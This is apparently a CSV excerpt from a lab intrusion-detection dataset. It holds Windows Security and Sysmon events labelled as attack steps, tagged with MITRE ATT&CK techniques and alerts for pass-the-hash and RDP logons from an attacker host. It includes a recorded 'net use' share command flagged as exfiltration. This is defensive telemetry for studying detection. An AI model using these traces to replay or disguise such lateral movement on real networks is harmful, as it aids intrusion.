4337,Attack Step 2,"May 9, 2025 @ 15:47:44.577",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4338,Attack Step 2,"May 9, 2025 @ 15:47:44.622",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p,,3,67027,A process was created.,,,
4339,Attack Step 2,"May 9, 2025 @ 15:47:46.397",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\sppsvc.exe,,3,67027,A process was created.,,,
4340,Attack Step 2,"May 9, 2025 @ 15:47:52.981",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4341,Attack Step 2,"May 9, 2025 @ 15:47:52.989",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4342,Attack Step 2,"May 9, 2025 @ 15:47:52.995",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.23\\MyShare /delete",,3,67027,A process was created.,,,
4343,Attack Step 2,"May 9, 2025 @ 15:47:53.025",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,C:\\WINDOWS\\system32\\wsmprovhost.exe -Embedding,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.23\\MyShare /delete",,3,92037,A net.exe connection to a remote resource was started by C:\\Windows\\System32\\wsmprovhost.exe,[T1567],[Exfiltration],[Exfiltration Over Web Service]
4344,Attack Step 2,"May 9, 2025 @ 15:48:15.978",15,10.12.25.3,Windows11,Application,16384,7156,,,,,,,,,,,3,60642,Software protection service scheduled successfully.,,,
4345,Attack Step 2,"May 9, 2025 @ 15:52:11.529",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4346,Attack Step 2,"May 9, 2025 @ 15:52:11.538",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4347,Attack Step 2,"May 9, 2025 @ 15:55:47.075",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4348,Attack Step 2,"May 9, 2025 @ 15:55:47.178",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k CameraMonitor,,3,67027,A process was created.,,,
4349,Attack Step 2,"May 9, 2025 @ 15:55:47.364",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k Camera,,3,67027,A process was created.,,,
4350,Attack Step 2,"May 9, 2025 @ 15:55:48.558",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4351,Attack Step 2,"May 9, 2025 @ 15:55:48.573",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k wsappx -p,,3,67027,A process was created.,,,
4352,Attack Step 2,"May 9, 2025 @ 15:55:48.582",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4353,Attack Step 2,"May 9, 2025 @ 15:55:48.590",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\backgroundTaskHost.exe\"" -ServerName:App.AppXpybpk6fj2fe0gb0jan49e6dncngk3pa1.mca",,3,67027,A process was created.,,,
4354,Attack Step 2,"May 9, 2025 @ 15:55:50.395",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4355,Attack Step 2,"May 9, 2025 @ 15:55:54.905",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4356,Attack Step 2,"May 9, 2025 @ 15:55:56.102",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\AppHostRegistrationVerifier.exe\""",,3,67027,A process was created.,,,
4357,Attack Step 2,"May 9, 2025 @ 15:55:56.106",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.25.390.0_x64__8wekyb3d8bbwe\\WindowsPackageManagerServer.exe\"" -Embedding",,3,67027,A process was created.,,,
4358,Attack Step 2,"May 9, 2025 @ 15:55:56.117",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4359,Attack Step 2,"May 9, 2025 @ 15:55:58.735",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4360,Attack Step 2,"May 9, 2025 @ 15:55:58.767",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k CameraMonitor,,3,67027,A process was created.,,,
4361,Attack Step 2,"May 9, 2025 @ 15:55:58.769",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\System32\\svchost.exe -k Camera,,3,67027,A process was created.,,,
4362,Attack Step 2,"May 9, 2025 @ 15:56:26.958",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4363,Attack Step 2,"May 9, 2025 @ 15:56:26.988",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\"" -ServerName:BackgroundTaskHost.WebAccountProvider",,3,67027,A process was created.,,,
4364,Attack Step 2,"May 9, 2025 @ 15:56:26.996",15,10.12.25.3,Windows11,Security,4673,4,,,,,,,,,,,4,60107,Failed attempt to perform a privileged operation,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4365,Attack Step 2,"May 9, 2025 @ 15:56:28.255",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding,,3,67027,A process was created.,,,
4366,Attack Step 2,"May 9, 2025 @ 15:56:35.931",15,10.12.25.3,Windows11,Microsoft-Windows-Windows Defender/Operational,1150,3168,,,,,,,,,,,3,62128,Windows Defender: Antimalware platform is running and in a healthy state,,,
4367,Attack Step 2,"May 9, 2025 @ 15:57:03.124",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding,,3,67027,A process was created.,,,
4368,Attack Step 2,"May 9, 2025 @ 15:57:03.149",15,10.12.25.3,Windows11,Security,4624,888,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4369,Attack Step 2,"May 9, 2025 @ 15:57:03.160",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\servicing\\TrustedInstaller.exe,,3,67027,A process was created.,,,
4370,Attack Step 2,"May 9, 2025 @ 15:57:03.168",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,C:\\WINDOWS\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.3764_none_a5067b2d776484b6\\TiWorker.exe -Embedding,,3,67027,A process was created.,,,
4371,Attack Step 2,"May 9, 2025 @ 15:57:16.510",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,taskhostw.exe,,3,67027,A process was created.,,,
4372,Attack Step 3,"May 9, 2025 @ 15:58:17.390",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4373,Attack Step 3,"May 9, 2025 @ 15:58:17.414",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that kali is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4374,Attack Step 3,"May 9, 2025 @ 15:58:17.458",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\SystemRoot\\System32\\smss.exe 000000cc 000000dc,,3,67027,A process was created.,,,
4375,Attack Step 3,"May 9, 2025 @ 15:58:17.491",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",,3,67027,A process was created.,,,
4376,Attack Step 3,"May 9, 2025 @ 15:58:17.509",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,winlogon.exe,,3,67027,A process was created.,,,
